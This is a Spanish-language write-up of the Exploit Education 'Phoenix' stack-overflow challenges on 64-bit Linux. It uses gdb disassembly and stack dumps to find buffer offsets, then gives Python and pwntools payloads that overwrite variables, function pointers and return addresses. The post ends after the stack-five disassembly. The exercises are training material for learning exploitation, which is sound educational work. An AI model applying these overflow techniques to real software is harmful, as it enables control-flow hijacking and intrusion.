
En este post nos vamos a meter con los retos de "phoenix" de exploit education, a diferencia de protostar, hablamos de 64 bits, el estandar actual.

## Stack-Zero

El stack Zero como reto inicial, no porpone ninguna dificultad, ya que simplemente se trata de desbordar el buffer metiendole demasaida "basura"
al programa.

Para profundizar más en el lenguaje a bajo nivel, bamos a desensamblar este bianrio. Vamo a analizarlo por partes.

```
(gdb) disas main
Dump of assembler code for function main:
  ----------------------------------------------------------------------
   0x00000000004005dd <+0>:     push   rbp
   0x00000000004005de <+1>:     mov    rbp,rsp
   0x00000000004005e1 <+4>:     sub    rsp,0x60   # Preparar una pila de 0x60 de tamaño, desde rsp
   0x00000000004005e5 <+8>:     mov    DWORD PTR [rbp-0x54],edi
   0x00000000004005e8 <+11>:    mov    QWORD PTR [rbp-0x60],rsi
  ----------------------------------------------------------------------
   0x00000000004005ec <+15>:    mov    edi,0x400680 
   0x00000000004005f1 <+20>:    call   0x400440 <puts@plt> 
[ #### (gdb) x/s 0x400680   # Metemos el edi el argumnto de puts, segun calling conventions.    ]
[ 0x400680:       "Welcome to phoenix/stack-zero, brought to you by https://exploit.education"  ]
  ---------------------------------------------------------------------- 
   0x00000000004005f6 <+25>:    mov    DWORD PTR [rbp-0x10],0x0
[ #### (gdb) x/x $rbp-0x10    # O sea aqui tenemos la famosa varaible "changme" que hay que rellenar  ]
[ 0x7fffffffe520: 0x00                                                                                ]
  ---------------------------------------------------------------------- 
   0x00000000004005fd <+32>:    lea    rax,[rbp-0x50]                 
   0x0000000000400601 <+36>:    mov    rdi,rax                        
   0x0000000000400604 <+39>:    call   0x400430 <gets@plt>            
[ #### (gdb) x/s $rbp-0x50    # Con las calling conventions metemos en rdi el argumento de gets, o sea nuestro input.  ]
[ 0x7fffffffe4e0: 'A' <repeats 11 times>                                                                               ]                                   
  ---------------------------------------------------------------------- 
   0x0000000000400609 <+44>:    mov    eax,DWORD PTR [rbp-0x10]
   0x000000000040060c <+47>:    test   eax,eax       # Se ve si eax (changeme = rbp+0x10) ha sido modificado o no
   0x000000000040060e <+49>:    je     0x40061c <main+63>
   0x0000000000400610 <+51>:    mov    edi,0x4006d0      # Por aqui vamos si hemos hecho bien.
   0x0000000000400615 <+56>:    call   0x400440 <puts@plt>
   0x000000000040061a <+61>:    jmp    0x400626 <main+73>
[ #### (gdb) x/s 0x4006d0                                                 ]
[ 0x4006d0:       "Well done, the 'changeme' variable has been changed!"  ]
[ (gdb) x/x $rbp-0x10     # La varaible changme que hay que modificar     ]
[ 0x7fffffffe520: 0x00                                                    ]

  ---------------------------------------------------------------------- 
   0x000000000040061c <+63>:    mov    edi,0x400708    
   0x0000000000400621 <+68>:    call   0x400440 <puts@plt>
[ #### (gdb) x/s 0x400708                                                                    ]
[ 0x400708:       "Uh oh, 'changeme' has not yet been changed. Would you like to try again?" ]
  ----------------------------------------------------------------------  
   0x0000000000400626 <+73>:    mov    edi,0x0
   0x000000000040062b <+78>:    call   0x400450 <exit@plt>
   
(gdb) b *0x000000000040062b
(gdb) run
AAAAAAAAAAA
(gdb) x/40x $rsp
0x7fffffffe4d0: 0xffffe588      0x00007fff      0x00000000      0x00000001
0x7fffffffe4e0: 0x41414141      0x41414141      0x00414141      0x00000000
0x7fffffffe4f0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffe500: 0x00000000      0x00000000      0xffffe588      0x00007fff
0x7fffffffe510: 0x00000001      0x00000000      0xffffe598      0x00007fff
0x7fffffffe520: 0x00000000      0x00000000      0x00000000      0x00000000
```
O sea que tanto analizando el ensamblador como la pila dicen que el input empieza en 0x7fffffffe4e0 y la variable a escribir esta en 0x7fffffffe520
```
(gdb) p/d 0x7fffffffe520 - 0x7fffffffe4e0 
$1 = 64
```
Buffer de 64 bits

```console
[user@phoenix]:$   python -c "print 'A'* 64" | ./stack-zero 
Welcome to phoenix/stack-zero, brought to you by https://exploit.education
Uh oh, 'changeme' has not yet been changed. Would you like to try again?
[user@phoenix]:$ python -c "print 'A'* 70" | ./stack-zero 
Welcome to phoenix/stack-zero, brought to you by https://exploit.education
Well done, the 'changeme' variable has been changed!
```

-----------------------------------------------------------------------------------------

## Stack - One

Aquí hay que sobreescribir la varaible pero con un valor en conreto, lo desensamble como arriba: 
```console
   mov edi,0x400750 ;call 0x4004c0 <puts@plt>
            puts("Welcome to phoenix/stack-one, brought to you by https://exploit.education")

   mov esi,0x4007a0; call  0x4004d0 <errx@plt>
            puts("specify an argument, to be copied into the \"buffer\"")

   lea rax,[rbp-0x50]; mov rdi,rax; call   0x4004a0 <strcpy@plt>
            char buffer (0x50);
            strcpy(buffer, input);   <- [rbp-0x50] 0x7fffffffe460:

   mov eax,DWORD PTR [rbp-0x10]; cmp eax,0x496c5962; jne 0x4006d7 <main+106>
            if buffer !=  0x496c5962: <- [rbp-0x10] 0x7fffffffe4a0
        
   mov edi,0x4007d8; call 0x4004c0 <puts@plt>
            puts("Well done, you have successfully set changeme to the correct value")
                 
   mov edi,0x400820; call   0x4004b0 <printf@plt>
            puts("Getting closer! changeme is currently \"\", we want 0x496c5962\n")
            
        (gdb) p/d 0x7fffffffe4a0 - 0x7fffffffe460 -> 64

[user@phoenix]:$ ./stack-one $(python -c "print 'A'* 64 + '\x62\x59\x6c\x49'") 
        Well done, you have successfully set changeme to the correct value
```
-----------------------------------------------------------------------------------------

## Stack - Three

Aqui hay un buffer de 64 bytes seguido por un puntero de función [Aqui](https://github.com/CUCUxii/Informatica/blob/main/Binarios/Stack.md#sobreescribir-un-puntero-de-instruccion) lo explico con detalle.

```console
[user@phoenix]:$ objdump -d ./stack-three | grep "^0"
...
000000000040069d <complete_level>:
...
```

El aunto es que tanto al ponerlo en oneliner o exploit no da buenos resultados, metiendo una "0xa" donde no debe. 

```console
[user@phoenix]:$ python -c "print 'A' * 64 + '\x9d\x06\x40\x00'" | ./stack-three 
calling function pointer @ 0xa0040069d; Segmentation fault
```
```python
from struct import pack
payload = 'A' * 64
payload += pack("I", 0x40069d)
print(payload)
```

Pero hay otro módulo llamado "pwntools" que está pensado parala explotación de bianrios (entre otras)
```python
from pwn import *
payload = 'A' * 64
payload += p64(0x40069d)
print(payload)
```
```console
[user@phoenix]:$ python /tmp/exploit.py | ./stack-three 
calling function pointer @ 0x40069d; Congratulations, you've finished phoenix/stack-three :-) Well done!
```
-----------------------------------------------------------------------------------------

## Stack - Four

He metido un par de "A" y con el gdb he parado antes de que salga de la funcíon, luego he abierto la pila a ver que hay.
Tambien se ve que el input de "A" empieza justo en rsp (la pila)

```
(gdb) x/40x $rsp
0x7fffffffe490: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe4a0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe4b0: 0x41414141      0x41414141      0x41414141      0x00004141
0x7fffffffe4c0: 0xf7ffb300      0x00007fff      0xf7db9934      0x00007fff
0x7fffffffe4d0: 0xffffe558      0x00007fff      0x0040068d      0x00000000
0x7fffffffe4e0: 0xffffe500      0x00007fff      0x0040068d      0x00000000   # despues de rbp esta la direccion de la siguiente funcion

(gdb) x/x $rbp
0x7fffffffe4e0: 0xffffe500
(gdb) p/d $rbp - $rsp 
$2 = 80
```

Es decir la direccion de la funcion hay que meterla despues de rbp (a mas de 80 de buffer).
Como estamos en 64 bits, la data es muy larga, por lo que se suele dividir en dos direcciones de memoria, asi que en vez de rbp +4 es +8.
```
(gdb) x/x 0x7fffffffe528
0x7fffffffe528: 0x0040068d
```
```python
from pwn import *
payload = 'A' * 88
payload += p64(0x40061d)
print(payload)
```
```console
[user@phoenix]:$  python /tmp/exploit.py | ./stack-four
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
```

---------------------------------------------------------------------------------------

# Stack - Five

Este tiene pinta de ser un shellcode buffer overflow
```
Dump of assembler code for function start_level:
   0x000000000040058d <+0>:     push   rbp
   0x000000000040058e <+1>:     mov    rbp,rsp
   0x0000000000400591 <+4>:     add    rsp,0xffffffffffffff80
   0x0000000000400595 <+8>:     lea    rax,[rbp-0x80]
   0x0000000000400599 <+12>:    mov    rdi,rax
   0x000000000040059c <+15>:    call   0x4003f0 <gets@plt>
   0x00000000004005a1 <+20>:    nop
   0x00000000004005a2 <+21>:    leave  
   0x00000000004005a3 <+22>:    ret    
(gdb) p/d 0x80
$1 = 128
```

















